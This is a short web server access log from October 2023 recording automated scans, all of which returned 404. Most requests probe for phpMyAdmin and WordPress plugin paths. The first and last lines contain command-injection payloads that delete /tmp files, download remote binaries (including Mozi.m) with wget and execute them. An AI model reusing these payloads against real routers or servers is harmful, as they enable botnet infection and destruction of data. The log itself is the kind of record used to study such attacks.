156.219.115.145 - - [22/Oct/2023:17:40:03 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws HTTP/1.1" 404 12981 "-" "Hello, world"
212.126.107.236 - - [23/Oct/2023:01:01:22 +0900] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
212.126.107.236 - - [23/Oct/2023:01:01:38 +0900] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
212.126.107.236 - - [23/Oct/2023:01:01:41 +0900] "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
212.126.107.236 - - [23/Oct/2023:01:01:48 +0900] "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
194.38.22.71 - - [23/Oct/2023:01:27:58 +0900] "GET /wp-content/plugins/wp-file-manager-pro/lib/php/connector.minimal.php HTTP/1.1" 404 12981 "-" "ALittle Client"
202.51.186.46 - - [23/Oct/2023:02:57:08 +0900] "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
202.51.186.46 - - [23/Oct/2023:02:57:09 +0900] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
202.51.186.46 - - [23/Oct/2023:02:57:11 +0900] "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
202.51.186.46 - - [23/Oct/2023:02:57:17 +0900] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
178.72.78.22 - - [23/Oct/2023:04:20:08 +0900] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 12981 "-" "-"
